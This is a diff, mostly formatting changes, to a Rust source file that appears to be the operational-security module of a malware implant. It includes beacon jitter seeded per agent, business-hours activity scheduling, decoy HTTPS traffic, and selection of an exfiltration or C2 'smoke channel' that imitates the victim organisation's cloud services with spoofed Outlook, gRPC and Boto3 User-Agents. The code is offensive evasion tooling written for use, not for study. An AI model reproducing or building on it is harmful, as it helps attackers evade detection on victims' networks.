@@ -5,9 +5,9 @@
 //   - Time adaptation: reduce activity off-hours, surge during peak
 //   - Traffic mimicry: match victim's observed cloud services
 
+use chrono::{Datelike, Timelike};
 use rand::rngs::StdRng;
 use rand::{Rng, SeedableRng};
-use chrono::{Datelike, Timelike};
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
@@ -34,10 +34,10 @@ impl Default for JitterConfig {
     fn default() -> Self {
         Self {
             seed: 0,
-            base_ms: 10_000,      // 10 seconds
-            jitter_percent: 30,    // ±30%
+            base_ms: 10_000,    // 10 seconds
+            jitter_percent: 30, // ±30%
             min_ms: 1_000,
-            max_ms: 120_000,       // 2 minutes
+            max_ms: 120_000, // 2 minutes
         }
     }
 }
@@ -50,9 +50,16 @@ impl JitterConfig {
             for (i, &b) in agent_id.iter().enumerate() {
                 s ^= (b as u64) << ((i % 8) * 8);
             }
-            if s == 0 { 1 } else { s }
+            if s == 0 {
+                1
+            } else {
+                s
+            }
         };
-        Self { seed, ..Default::default() }
+        Self {
+            seed,
+            ..Default::default()
+        }
     }
 
     /// Compute the next sleep duration with jitter applied.
@@ -67,7 +74,11 @@ impl JitterConfig {
 
         let offset: i64 = if self.seed != 0 {
             let seed = self.seed.wrapping_add(
-                SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs() / 60
+                SystemTime::now()
+                    .duration_since(UNIX_EPOCH)
+                    .unwrap_or_default()
+                    .as_secs()
+                    / 60,
             );
             let mut rng = StdRng::seed_from_u64(seed);
             rng.gen_range(-(half_range as i64)..=(half_range as i64))
@@ -76,14 +87,19 @@ impl JitterConfig {
             rng.gen_range(-(half_range as i64)..=(half_range as i64))
         };
 
-        let ms = (self.base_ms as i64 + offset).max(self.min_ms as i64).min(self.max_ms as i64);
+        let ms = (self.base_ms as i64 + offset)
+            .max(self.min_ms as i64)
+            .min(self.max_ms as i64);
         Duration::from_millis(ms as u64)
     }
 
     /// Whether it's time to act based on the jitter schedule.
     /// Returns true if `last_ts + next_delay` has passed.
     pub fn is_due(&self, last_ts: u64) -> bool {
-        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_millis() as u64;
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis() as u64;
         now >= last_ts + self.base_ms
     }
 }
@@ -176,7 +192,10 @@ impl DecoyProfile {
             let j = rng.gen_range(0..=i);
             indices.swap(i, j);
         }
-        indices[..count].iter().map(|&i| &self.requests[i]).collect()
+        indices[..count]
+            .iter()
+            .map(|&i| &self.requests[i])
+            .collect()
     }
 
     /// Fire decoy requests asynchronously (spawn and forget).
@@ -194,7 +213,10 @@ impl DecoyProfile {
                     let url = format!("https://{}{}", req.host, req.path);
                     let _ = match req.method.as_str() {
                         "GET" => client.get(&url).send(),
-                        "POST" => client.post(&url).header("content-type", &req.content_type).send(),
+                        "POST" => client
+                            .post(&url)
+                            .header("content-type", &req.content_type)
+                            .send(),
                         _ => return,
                     };
                 }
@@ -286,8 +308,8 @@ impl TrafficMimic {
     pub fn from_org_profile(profile: &crate::smoke_signals::OrgCloudProfile) -> Self {
         let mut observed = HashMap::new();
         if profile.microsoft_365 {
-        *observed.entry("office365".into()).or_insert(0) += 1;
-        *observed.entry("azure".into()).or_insert(0) += 1;
+            *observed.entry("office365".into()).or_insert(0) += 1;
+            *observed.entry("azure".into()).or_insert(0) += 1;
         }
         if profile.google_workspace {
             *observed.entry("google".into()).or_insert(0) += 1;
@@ -302,13 +324,14 @@ impl TrafficMimic {
             *observed.entry("slack".into()).or_insert(0) += 1;
         }
 
-        let mut preferred: Vec<(&u64, &String)> = observed.iter()
-            .map(|(k, v)| (v, k))
-            .collect();
+        let mut preferred: Vec<(&u64, &String)> = observed.iter().map(|(k, v)| (v, k)).collect();
         preferred.sort_by(|a, b| b.0.cmp(a.0));
         let preferred: Vec<String> = preferred.into_iter().map(|(_, k)| k.clone()).collect();
 
-        Self { observed_services: observed, preferred }
+        Self {
+            observed_services: observed,
+            preferred,
+        }
     }
 
     /// Select the best smoke channel based on learned traffic.
@@ -331,7 +354,9 @@ impl TrafficMimic {
             return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
         }
         match self.preferred[0].as_str() {
-            "office365" | "azure" => "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)",
+            "office365" | "azure" => {
+                "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)"
+            }
             "google" => "grpc-node-js/1.8.14 grpc-c/30.0 (linux; chttp2)",
             "aws" => "Boto3/1.28.62 Python/3.11.5 Linux/6.2.0-35-generic",
             _ => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -401,7 +426,9 @@ impl OpsecEngine {
     /// Execute one OPSEC cycle: fire decoys, return the delay before next action.
     pub fn cycle(&mut self) -> Duration {
         self.last_activation = SystemTime::now()
-            .duration_since(UNIX_EPOCH).unwrap_or_default().as_millis() as u64;
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis() as u64;
 
         if !self.should_act() {
             return Duration::from_secs(60); // Check again in 60s
@@ -422,14 +449,16 @@ impl OpsecEngine {
 
     /// Get the recommended smoke channel based on mimicry.
     pub fn recommended_channel(&self) -> crate::smoke_signals::SmokeChannel {
-        self.mimic.as_ref()
+        self.mimic
+            .as_ref()
             .map(|m| m.select_channel())
             .unwrap_or_else(crate::smoke_signals::SmokeChannel::random)
     }
 
     /// Recommended User-Agent based on mimicry.
     pub fn recommended_user_agent(&self) -> &str {
-        self.mimic.as_ref()
+        self.mimic
+            .as_ref()
             .map(|m| m.user_agent())
             .unwrap_or("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     }
@@ -482,15 +511,18 @@ mod tests {
     fn test_jitter_different_seeds() {
         let j1 = JitterConfig::with_seed(b"agent-alpha");
         let j2 = JitterConfig::with_seed(b"agent-beta");
-        let d1 = j1.next_delay();
-        let d2 = j2.next_delay();
+        let _d1 = j1.next_delay();
+        let _d2 = j2.next_delay();
         // Very unlikely to be equal for different seeds
         // (run multiple times to verify statistically)
     }
 
     #[test]
     fn test_jitter_is_due() {
-        let j = JitterConfig { base_ms: 1, ..Default::default() };
+        let j = JitterConfig {
+            base_ms: 1,
+            ..Default::default()
+        };
         assert!(j.is_due(0));
     }
 
@@ -506,7 +538,7 @@ mod tests {
     fn test_schedule_should_act() {
         let s = ActivitySchedule::default();
         let hour = chrono::Local::now().hour();
-        if hour >= 8 && hour <= 18 {
+        if (8..=18).contains(&hour) {
             // Should generally be active during business hours
             assert!(s.should_act(0.3));
         }
@@ -556,7 +588,10 @@ mod tests {
         };
         let mimic = TrafficMimic::from_org_profile(&profile);
         let ch = mimic.select_channel();
-        assert!(matches!(ch, crate::smoke_signals::SmokeChannel::GoogleDrive));
+        assert!(matches!(
+            ch,
+            crate::smoke_signals::SmokeChannel::GoogleDrive
+        ));
     }
 
     #[test]
@@ -605,8 +640,10 @@ mod tests {
 
     #[test]
     fn test_schedule_weekend() {
-        let mut s = ActivitySchedule::default();
-        s.weekend_multiplier = 0.0;
+        let s = ActivitySchedule {
+            weekend_multiplier: 0.0,
+            ..ActivitySchedule::default()
+        };
         // Force a weekend day
         for &day in &[0u8, 6u8] {
             let weekend = s.weekend_days.contains(&day);
